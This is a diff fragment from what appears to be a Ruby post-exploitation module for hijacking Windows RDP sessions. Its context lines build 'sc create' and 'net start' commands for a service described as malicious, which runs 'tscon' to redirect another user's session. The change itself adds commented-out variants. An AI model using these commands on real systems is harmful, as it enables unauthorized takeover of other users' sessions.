@@ -210,6 +210,9 @@ def ls_stage2
   com_start = "net start #{com_servi}"  # start remote malicious service
   com_comps = "%systemdrive%\\system32\\cmd.exe" # cmd.exe compspec path
   com_execs = "sc create #{com_servi} binpath= \"#{com_comps} /k tscon #{com_useid} /dest:rdp-tcp#55\"" # create service
+#
+# com_execs = "tscon #{com_useid} /dest:#{User_acc_name}\"" # create service
+#
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['HIJACK_ID'] == 'nil' || datastore['SERVICE_NAME'] == 'nil'
